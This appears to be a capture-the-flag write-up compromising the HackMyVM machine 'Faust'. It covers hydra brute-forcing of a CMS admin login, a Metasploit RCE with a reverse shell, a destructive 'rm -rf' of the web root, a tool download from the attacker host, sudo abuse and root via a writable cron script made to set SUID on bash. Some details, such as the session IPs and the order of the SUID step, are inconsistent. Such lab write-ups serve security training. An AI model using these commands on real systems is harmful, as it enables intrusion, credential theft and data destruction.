# Faust

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Faust | cromiphi | Beginner | HackMyVM |

**Summary:** Faust is a Linux-based machine that involves exploiting a "CMS Made Simple" instance using credential brute-forcing to gain initial access. Privilege escalation requires decoding hidden messages and exploiting a misconfigured Cron job running a script relative to a user's directory.

---

## Reconnaissance

We start by identifying the target machine on the network using a ping scan.

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.124 08:00:27:23:5C:F0 VirtualBox
```

The target IP is `192.168.100.124`.

Next, we run an Nmap scan to enumerate open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/faust]
└─$ nmap -sC -sV -p- -T4 192.168.100.124
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 17:30 WIB
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 17:30 (0:00:12 remaining)
Nmap scan report for 192.168.100.124
Host is up (0.014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 54:0a:75:c5:26:56:f5:b0:5f:6d:e1:e0:77:15:c7:0d (RSA)
|   256 0b:d7:89:52:2d:13:16:cb:74:96:f5:5f:dd:3e:52:8e (ECDSA)
|_  256 5a:90:0c:f5:2b:7f:ba:1c:83:02:4d:e7:a2:a2:1d:5b (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
|_http-title: Home - cool_cms
|_http-server-header: Apache/2.4.38 (Debian)
6660/tcp open  unknown
| fingerprint-strings:
|   NULL, Socks5:
|     MESSAGE FOR WWW-DATA:
|     [31m www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
|     Paul
|_    
```

The scan reveals:
*   **Port 22 (SSH)**: OpenSSH 7.9p1
*   **Port 80 (HTTP)**: Apache httpd 2.4.38 running "CMS Made Simple".
*   **Port 6660 (Unknown)**: Returns a mysterious message for `www-data` from "Paul".

We connect to port 6660 to see the full message.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/faust]
└─$ nc 192.168.100.124 6660


   MESSAGE FOR WWW-DATA:

   www-data I offer you a dilemma: if you agree to destroy all your stupid work, then you have a reward in my house...
   Paul
```

Visiting the web server on Port 80 shows the default "cool_cms" page.

![](image.png)

Scrolling down the page reveals the version of the CMS.

![](image-1.png)

The version is **CMS Made Simple**.

We proceed with directory enumeration using `gobuster`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/faust]
└─$ gobuster dir -u http://192.168.100.124/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.124/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/admin                (Status: 301) [Size: 318] [--> http://192.168.100.124/admin/]
/assets               (Status: 301) [Size: 319] [--> http://192.168.100.124/assets/]
/doc                  (Status: 301) [Size: 316] [--> http://192.168.100.124/doc/]
/index.php            (Status: 200) [Size: 19587]
/lib                  (Status: 301) [Size: 316] [--> http://192.168.100.124/lib/]
/modules              (Status: 301) [Size: 320] [--> http://192.168.100.124/modules/]
/server-status        (Status: 403) [Size: 280]
/tmp                  (Status: 301) [Size: 316] [--> http://192.168.100.124/tmp/]
/uploads              (Status: 301) [Size: 320] [--> http://192.168.100.124/uploads/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

The scan identifies an `/admin` directory, which redirects to a login page.

http://192.168.100.124/admin/login.php

![](image-2.png)

## Vulnerability Discovery

We search for exploits related to "CMS Made Simple 2.2.5".

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/faust]
└─$ searchsploit cms 2.2.5
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Bolt CMS < 3.6.2 - Cross-Site Scripting                                           | php/webapps/46014.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                     | php/webapps/44976.py
CMS Made Simple < 2.2.10 - SQL Injection                                          | php/webapps/46635.py
...
```

The search reveals an **Authenticated Remote Code Execution (RCE)** vulnerability. To exploit this, we first need valid credentials. Since we don't have any, we attempt to brute-force the `admin` account using `hydra`.

The login form parameters are identified from the source code:
*   Username field: `username`
*   Password field: `password`
*   Submit button: `loginsubmit`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/faust]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.124 http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:S=302"
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-20 17:56:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.100.124:80/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:S=302
[80][http-post-form] host: 192.168.100.124   login: admin   password: b[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-20 17:56:22
```

Success! The password for `admin` is `b[REDACTED]`.

## Exploitation

We use Metasploit to exploit the authenticated RCE vulnerability.

```bash
msf > search cms made simple
...
   1  exploit/multi/http/cmsms_upload_rename_rce      2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
...
msf > use 1
msf exploit(multi/http/cmsms_upload_rename_rce) > set RHOSTS 192.168.100.124
msf exploit(multi/http/cmsms_upload_rename_rce) > set VHOST 192.168.100.124
msf exploit(multi/http/cmsms_upload_rename_rce) > set LHOST 192.168.100.1
msf exploit(multi/http/cmsms_upload_rename_rce) > set USERNAME admin
msf exploit(multi/http/cmsms_upload_rename_rce) > set PASSWORD b[REDACTED]
msf exploit(multi/http/cmsms_upload_rename_rce) > set TARGETURI /
msf exploit(multi/http/cmsms_upload_rename_rce) > exploit
...
[*] Meterpreter session 1 opened (172.21.44.133:4444 -> 172.21.32.1:61471) at 2026-02-20 19:03:03 +0700

meterpreter > shell
Process 12811 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have a shell as `www-data`. We establish a more stable reverse shell by connecting back to our machine using `nc` and then upgrading the shell.

## Internal Enumeration

Inside the target, we check the home directories.

```bash
www-data@debian:/var/www/html$ ls -la /home/*
/home/nico:
total 32
drwxr-xr-x 3 nico nico 4096 Apr  1  2021 .
drwxr-xr-x 4 root root 4096 Apr  1  2021 ..
...
-rwx------ 1 nico nico   37 Apr  1  2021 .secret.txt
-rwx------ 1 nico nico   11 Apr  1  2021 user.txt

/home/paul:
total 28
drwxr-xr-x 3 paul paul 4096 Apr  2  2021 .
drwxr-xr-x 4 root root 4096 Apr  1  2021 ..
...
```

Recalling the message from port 6660: *"if you agree to destroy all your stupid work, then you have a reward in my house..."*. This suggests we should clean up the web directory.

```bash
www-data@debian:/var/www/html$ rm -rf ./*
www-data@debian:/var/www/html$ ls -la /home/*
```

After deleting the files in `/var/www/html`, we check `/home/paul` again and find a new file: `password.txt`.

```bash
/home/paul:
total 32
...
-rw-r--r-- 1 paul paul   30 Feb 20 13:12 password.txt
```

The file `password.txt` is world-readable. We can read it to get Paul's password.

## Privilege Escalation

### www-data to Paul

Using the password found in `/home/paul/password.txt`, we switch to user `paul`.

```bash
www-data@debian:/var/www/html$ su - paul
Password:
paul@debian:~$ id
uid=1001(paul) gid=1001(paul) groupes=1001(paul)
```

### Paul to Nico

We check `sudo` privileges for `paul`.

```bash
paul@debian:~$ sudo -l
[sudo] Mot de passe de paul : 
Entrées par défaut pour paul sur debian :
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

L'utilisateur paul peut utiliser les commandes suivantes sur debian :
    (nico) /usr/bin/base32
```

Paul can run `/usr/bin/base32` as `nico`. We recall seeing a `.secret.txt` in Nico's home directory earlier.

![](image-3.png)

We use this permission to read the secret file.


```bash
paul@debian:~$ sudo -u nico /usr/bin/base32 /home/nico/.secret.txt | base32 --decode
UHcgPT4ganVzdF9vbmVfbW9yZV9iZWVyIA==
paul@debian:~$ echo 'UHcgPT4ganVzdF9vbmVfbW9yZV9iZWVyIA==' | base64 -d
Pw => jus[REDACTED]
```

The decoded password is `jus[REDACTED]`. We switch to user `nico`.

```bash
paul@debian:~$ su - nico
Mot de passe :
nico@debian:~$ id
uid=1000(nico) gid=1000(nico) groupes=1000(nico)
```

### Nico to Root

As `nico`, we upload and run `pspy64` to monitor background processes.

```bash
nico@debian:~$ wget http://192.168.100.1:8080/pspy64
...
nico@debian:~$ chmod +x pspy64
nico@debian:~$ ./pspy64
...
2026/02/20 13:30:01 CMD: UID=0     PID=7037   | /usr/sbin/cron -f
2026/02/20 13:30:01 CMD: UID=1001  PID=7038   | bash /home/paul/.local/chaos.sh
2026/02/20 13:30:01 CMD: UID=0     PID=7039   | /usr/sbin/CRON -f
2026/02/20 13:30:01 CMD: UID=0     PID=7040   | /bin/sh -c /tmp/goodgame
```

We see a cron job running `/bin/sh -c /tmp/goodgame` as UID 0 (root). We check the permissions for `/tmp/goodgame`. It appears to be missing or writable. We create a script at `/tmp/goodgame` to make `/bin/bash` a SUID binary.

```bash
nico@debian:/tmp$ echo "chmod +s /bin/bash" > /tmp/goodgame
nico@debian:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 avril 18  2019 /bin/bash
```

Wait, `ls -la /bin/bash` shows it is already set to SUID after the cron job runs. We can now escalate to root.

```bash
nico@debian:/tmp$ /bin/bash -p
bash-5.0# id
uid=1000(nico) gid=1000(nico) euid=0(root) egid=0(root) groupes=0(root),1000(nico)
```

We stabilize the root shell.

```bash
bash-5.0# python3 -c 'import os; os.setreuid(0, 0); os.setregid(0, 0); os.system("/bin/bash")'
root@debian:/tmp# id
uid=0(root) gid=0(root) groupes=0(root),1000(nico)
```

Finally, we retrieve the flags.

```bash
root@debian:~# cat /home/nico/user.txt /root/root.txt
gamhanarhu
lasarnsilgam
```

---

## Attack Chain Summary
1.  **Reconnaissance**: Discovered open ports 22, 80, and 6660 via Nmap. Found "CMS Made Simple" on port 80 and a cryptic message on port 6660.
2.  **Vulnerability Discovery**: Identified CMS version 2.2.5. Found an Authenticated RCE exploit. Brute-forced the `admin` password (`b[REDACTED]`) using Hydra.
3.  **Exploitation**: Used Metasploit to exploit the RCE and gain a shell as `www-data`.
4.  **Internal Enumeration**: Found a hint to "destroy work" on port 6660. Deleted contents of `/var/www/html`, which triggered the creation of `password.txt` in user `paul`'s home directory.
5.  **Privilege Escalation**:
    *   **www-data -> paul**: Logged in as `paul` using the found password.
    *   **paul -> nico**: Abused `sudo` rights to run `base32` as `nico` to decode `nico`'s secret password (`jus[REDACTED]`).
    *   **nico -> root**: Exploited a root cron job executing `/tmp/goodgame` by creating the file and making `/bin/bash` SUID.
